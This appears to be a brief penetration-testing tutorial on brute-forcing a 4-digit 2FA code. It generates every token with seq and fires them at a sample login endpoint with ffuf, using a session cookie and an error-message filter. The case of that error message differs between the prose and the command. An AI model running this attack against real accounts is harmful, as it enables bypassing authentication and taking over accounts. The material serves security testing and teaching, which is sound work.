# Brute-Forcing 2FA codes
***
### Attacking Two-Factor Authentication (2FA)
#### The most common 2FA implementations depends on the user's password and a time-based one-time password (TOTP) sent to the user's smartphone by an authenticator app or through SMS. Mostly TOPs consist of digits, making them easily guessable if there isn't any measure implemented against successive submissions of incorrect tokens.
#### Example of a brute-force attack against a web application secured with 2FA and expecting a TOTP token of 4 digits
#### Firstly, we generate a wordlist containing all 4-digit numbers from 0000 to 9999:
```bash
$ seq -w 0 9999 > tokens.txt
```
#### Then we use ffuf to brute-force the correct TOTP by filtering out responses containing the **Invalid 2FA code** error message.

```bash
$ ffuf -w ./tokens.txt -u http://qwerty.gg/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=kbfvm3b0dh1ibgha7ifd0hr7o55" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```